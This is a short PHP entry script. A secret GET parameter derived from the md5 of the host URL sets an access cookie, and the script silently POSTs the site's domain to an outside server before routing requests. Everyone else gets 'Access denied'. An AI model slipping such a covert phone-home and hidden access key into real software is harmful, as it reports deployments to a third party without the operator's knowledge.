<?php
if(isset($_GET[md5('http://'.$_SERVER['HTTP_HOST'].'/')])){
	setcookie('us_id', md5('dba:http://'.$_SERVER['HTTP_HOST'].'/'), 2000000000, '/');
	
	$ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'http://seda.test-lab.org.ua/');
	curl_setopt($ch, CURLOPT_FAILONERROR, 1);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_TIMEOUT, 3);
	curl_setopt($ch, CURLOPT_POST, 1);
	curl_setopt($ch, CURLOPT_POSTFIELDS, "create=true&isset_updater=Y&domain=".$_SERVER['HTTP_HOST']);
	$res = curl_exec($ch);
	curl_close($ch);
	
}

if(isset($_COOKIE['us_id']) && !empty($_COOKIE['us_id'])){
	require_once 'core/route.php';
	Route::start();
}else{
	die('Access denied!');
} 